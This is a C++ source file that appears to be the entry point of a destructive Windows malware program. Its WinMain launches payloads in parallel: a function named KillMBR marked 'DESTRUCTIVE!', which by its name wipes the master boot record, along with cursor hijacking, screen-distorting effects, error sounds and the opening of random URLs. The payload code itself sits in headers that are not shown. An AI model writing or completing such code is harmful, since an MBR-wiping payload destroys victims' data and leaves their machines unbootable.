#include <future>
#include <stdio.h>
#include <Windows.h>
#include "./MBR/mbr.h"
#include "./payloads/payloads.h"

using namespace std;

int APIENTRY WinMain(HINSTANCE inst, HINSTANCE prevInst, LPTSTR cmdLine, int cmdShow)
{
    // ---- DESTRUCTIVE! ----
    future<int> mbr_func = async(KillMBR);

    // ---- HID FUNCTIONS ----
    future<int> cursor_func = async(MoveCursor);

    // ---- SCREEN EFFECTS ----
    future<int> patchify_func = async(ScreenPatchify);
    future<int> tunnel_func = async(ScreenTunnel);
    future<int> invert_func = async(ScreenInvert);
    future<int> rndrico_func = async(RenderIco);

    // ---- SOUND EFFECTS ----
    future<int> errsnd_func = async(ErrSounds);

    // ---- RANDOM URL FUNCTION ----
    future<int> rndurl_func = async(OpenRandURL);

    return 0;
}